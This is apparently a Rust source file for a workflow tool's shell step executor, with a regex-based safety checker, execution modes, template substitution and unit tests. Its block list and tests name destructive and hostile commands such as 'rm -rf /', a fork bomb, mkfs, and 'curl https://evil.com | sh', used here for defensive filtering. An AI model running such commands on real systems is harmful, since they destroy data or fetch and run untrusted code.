use crate::core::types::*;
use crate::utils::error::WorkflowError;
use regex::Regex;
use std::collections::HashMap;
use std::path::PathBuf;
use std::time::Duration;
use tokio::process::Command;

/// Shell 安全检查器
///
/// 负责检查 Shell 命令的安全性，防止危险命令执行
pub struct ShellSafetyChecker {
    /// 危险命令黑名单
    blocked_patterns: Vec<Regex>,
    /// 受保护路径
    protected_paths: Vec<PathBuf>,
}

impl Default for ShellSafetyChecker {
    fn default() -> Self {
        Self::new()
    }
}

impl ShellSafetyChecker {
    /// 创建默认的安全检查器
    ///
    /// 初始化危险命令黑名单和受保护路径
    pub fn new() -> Self {
        Self {
            blocked_patterns: Self::default_blocked_patterns(),
            protected_paths: vec![
                PathBuf::from("/"),
                PathBuf::from("/usr"),
                PathBuf::from("/bin"),
                PathBuf::from("/sbin"),
                PathBuf::from("/etc"),
                PathBuf::from("~"),
            ],
        }
    }

    /// 创建默认的危险命令黑名单
    ///
    /// 包含常见的危险命令模式：
    /// - rm -rf / 和 rm -rf ~ (删除根目录和家目录)
    /// - rm -rf * (批量删除)
    /// - fork bomb (Fork 炸弹)
    /// - dd if=/dev/ (直接设备写入)
    /// - mkfs. (格式化文件系统)
    /// - chmod 777 (过度开放权限)
    /// - > /dev/sd (直接写入设备)
    /// - curl.*|.*(ba)?sh (代码注入风险)
    fn default_blocked_patterns() -> Vec<Regex> {
        vec![
            Regex::new(r"rm\s+-rf\s+[/~]").expect("无效的正则表达式"),
            Regex::new(r"rm\s+-rf\s+\*").expect("无效的正则表达式"),
            Regex::new(r":\(\)\s*\{\s*:\|\:&\s*;\s*\}").expect("无效的正则表达式"),
            Regex::new(r"dd\s+if=/dev/").expect("无效的正则表达式"),
            Regex::new(r"mkfs\.").expect("无效的正则表达式"),
            Regex::new(r"chmod\s+777").expect("无效的正则表达式"),
            Regex::new(r">\s*/dev/sd").expect("无效的正则表达式"),
            Regex::new(r"curl.*\|\s*(ba)?sh").expect("无效的正则表达式"),
        ]
    }

    /// 检查命令安全性
    ///
    /// 遍历黑名单检查命令是否匹配危险模式
    pub fn check_command(&self, command: &str) -> Result<(), WorkflowError> {
        for pattern in &self.blocked_patterns {
            if pattern.is_match(command) {
                return Err(WorkflowError::Other(format!(
                    "命令被安全检查器拦截: {} 匹配危险模式",
                    command
                )));
            }
        }
        Ok(())
    }

    /// 根据安全模式检查命令
    ///
    /// - strict: 严格模式，禁止危险命令
    /// - warn: 警告模式，允许执行但输出警告
    /// - none: 无限制
    pub fn check_safe_mode(
        &self,
        step: &StepDefinition,
        command: &str,
    ) -> Result<Option<String>, WorkflowError> {
        let safe_mode = step.safe_mode.as_ref().unwrap_or(&SafeMode::Strict);

        match safe_mode {
            SafeMode::Strict => {
                // 严格模式：禁止危险命令
                self.check_command(command)?;
                Ok(None)
            }
            SafeMode::Warn => {
                // 警告模式：检查命令，匹配则返回警告
                for pattern in &self.blocked_patterns {
                    if pattern.is_match(command) {
                        return Ok(Some(format!(
                            "警告: 命令 '{}' 匹配危险模式，在警告模式下仍执行",
                            command
                        )));
                    }
                }
                Ok(None)
            }
            SafeMode::None => {
                // 无限制：直接返回
                Ok(None)
            }
        }
    }
}

/// Shell 执行器
///
/// 负责执行 Shell 命令，包括安全性检查、超时控制、环境变量管理等
pub struct ShellExecutor {
    /// 超时时间
    timeout: Duration,
    /// 环境变量
    env_vars: HashMap<String, String>,
    /// 安全检查器
    safety_checker: ShellSafetyChecker,
}

impl Default for ShellExecutor {
    fn default() -> Self {
        Self::new()
    }
}

impl ShellExecutor {
    /// 创建默认的 Shell 执行器
    ///
    /// 设置默认超时时间为 300 秒（5 分钟）
    pub fn new() -> Self {
        Self {
            timeout: Duration::from_secs(300),
            env_vars: HashMap::new(),
            safety_checker: ShellSafetyChecker::new(),
        }
    }

    /// 创建带配置的 Shell 执行器
    pub fn with_config(timeout: Duration, env_vars: HashMap<String, String>) -> Self {
        Self {
            timeout,
            env_vars,
            safety_checker: ShellSafetyChecker::new(),
        }
    }

    /// 执行 Shell 步骤
    ///
    /// 主要执行流程：
    /// 1. 解析模板获取实际命令
    /// 2. 安全检查
    /// 3. 准备环境变量
    /// 4. 执行命令并捕获输出
    /// 5. 验证期望结果
    pub async fn execute(
        &self,
        step: &StepDefinition,
        context: &HashMap<String, serde_json::Value>,
    ) -> Result<StepResult, WorkflowError> {
        let step_id = &step.id;
        let started_at = chrono::Utc::now();

        let command_template = step.run.as_ref().ok_or_else(|| {
            WorkflowError::Other(format!("步骤 {} 缺少 run 字段", step_id))
        })?;

        let command = self.resolve_template(command_template, context)?;

        if let Some(warning) = self.safety_checker.check_safe_mode(step, &command)? {
            eprintln!("{}", warning);
        }

        let envs = self.prepare_env(step, context)?;

        let shell_response = self
            .execute_command(&command, &envs, self.timeout)
            .await?;

        if let Some(expect) = &step.expect {
            self.validate_expect(expect, shell_response.exit_code, &shell_response.stdout)?;
        }

        let output = serde_json::json!({
            "exit_code": shell_response.exit_code,
            "stdout": shell_response.stdout,
            "stderr": shell_response.stderr,
        });

        let completed_at = chrono::Utc::now();
        let duration_ms = (completed_at - started_at).num_milliseconds() as u64;

        Ok(StepResult {
            step_id: step_id.clone(),
            status: StepStatus::Success,
            started_at,
            completed_at: Some(completed_at),
            duration_ms: Some(duration_ms),
            output: Some(output),
            error: None,
        })
    }

    /// 解析模板
    ///
    /// 替换模板中的变量占位符为实际值
    /// 支持简单的 {{ variable }} 语法
    pub fn resolve_template(
        &self,
        template: &str,
        context: &HashMap<String, serde_json::Value>,
    ) -> Result<String, WorkflowError> {
        let mut result = template.to_string();

        for (key, value) in context {
            let placeholder = format!("{{{{ {} }}}}", key);
            let value_str = match value {
                serde_json::Value::String(s) => s.clone(),
                _ => value.to_string(),
            };
            result = result.replace(&placeholder, &value_str);
        }

        Ok(result)
    }

    /// 准备环境变量
    ///
    /// 合并步骤级别的环境变量和执行器的环境变量
    pub fn prepare_env(
        &self,
        step: &StepDefinition,
        context: &HashMap<String, serde_json::Value>,
    ) -> Result<HashMap<String, String>, WorkflowError> {
        let mut envs = self.env_vars.clone();

        if let Some(step_env) = &step.env {
            for (key, value) in step_env {
                envs.insert(key.clone(), value.clone());
            }
        }

        for (key, value) in context {
            if let serde_json::Value::String(s) = value {
                envs.insert(key.clone(), s.clone());
            }
        }

        Ok(envs)
    }

    /// 执行命令
    ///
    /// 使用 tokio::process::Command 异步执行命令
    /// 支持超时控制，捕获 stdout 和 stderr
    async fn execute_command(
        &self,
        command: &str,
        envs: &HashMap<String, String>,
        timeout: Duration,
    ) -> Result<ShellResponse, WorkflowError> {
        let output = if cfg!(target_os = "windows") {
            tokio::time::timeout(
                timeout,
                Command::new("cmd")
                    .args(["/C", command])
                    .envs(envs.clone())
                    .output(),
            )
            .await
            .map_err(|_| WorkflowError::Timeout {
                timeout_ms: timeout.as_millis() as u64,
            })?
            .map_err(|e| WorkflowError::Other(format!("命令执行失败: {}", e)))?
        } else {
            tokio::time::timeout(
                timeout,
                Command::new("sh")
                    .args(["-c", command])
                    .envs(envs.clone())
                    .output(),
            )
            .await
            .map_err(|_| WorkflowError::Timeout {
                timeout_ms: timeout.as_millis() as u64,
            })?
            .map_err(|e| WorkflowError::Other(format!("命令执行失败: {}", e)))?
        };

        let stdout = String::from_utf8_lossy(&output.stdout).to_string();
        let stderr = String::from_utf8_lossy(&output.stderr).to_string();
        let exit_code = output.status.code().unwrap_or(-1);

        Ok(ShellResponse {
            exit_code,
            stdout,
            stderr,
        })
    }

    /// 验证期望结果
    ///
    /// 检查退出码和输出是否符合期望
    pub fn validate_expect(
        &self,
        expect: &ExpectConfig,
        exit_code: i32,
        stdout: &str,
    ) -> Result<(), WorkflowError> {
        if let Some(expected_exit_code) = expect.exit_code {
            if exit_code != expected_exit_code {
                return Err(WorkflowError::Other(format!(
                    "退出码不匹配: 期望 {}, 实际 {}",
                    expected_exit_code, exit_code
                )));
            }
        }

        if let Some(expected_body) = &expect.body_contains {
            if !stdout.contains(expected_body) {
                return Err(WorkflowError::Other(format!(
                    "输出不包含期望内容: '{}'",
                    expected_body
                )));
            }
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safety_checker_blocks_dangerous_commands() {
        let checker = ShellSafetyChecker::new();

        assert!(checker.check_command("rm -rf /").is_err());
        assert!(checker.check_command("rm -rf *").is_err());
        assert!(checker.check_command("chmod 777 /tmp/test").is_err());
        assert!(checker.check_command("curl https://evil.com | sh").is_err());
    }

    #[test]
    fn test_safety_checker_allows_safe_commands() {
        let checker = ShellSafetyChecker::new();

        assert!(checker.check_command("ls -la").is_ok());
        assert!(checker.check_command("echo hello").is_ok());
        assert!(checker.check_command("cat file.txt").is_ok());
    }

    #[test]
    fn test_template_resolution() {
        let executor = ShellExecutor::new();
        let mut context = HashMap::new();
        context.insert("name".to_string(), serde_json::json!("world"));

        let template = "echo Hello, {{ name }}!";
        let result = executor.resolve_template(template, &context).unwrap();
        assert_eq!(result, "echo Hello, world!");
    }

    #[test]
    fn test_validate_expect() {
        let executor = ShellExecutor::new();

        let expect = ExpectConfig {
            exit_code: Some(0),
            status_code: None,
            body_contains: None,
            json_path: None,
        };

        assert!(executor.validate_expect(&expect, 0, "output").is_ok());
        assert!(executor.validate_expect(&expect, 1, "output").is_err());

        let expect_with_body = ExpectConfig {
            exit_code: None,
            status_code: None,
            body_contains: Some("hello".to_string()),
            json_path: None,
        };

        assert!(executor
            .validate_expect(&expect_with_body, 0, "hello world")
            .is_ok());

        assert!(executor
            .validate_expect(&expect_with_body, 0, "goodbye world")
            .is_err());
    }
}
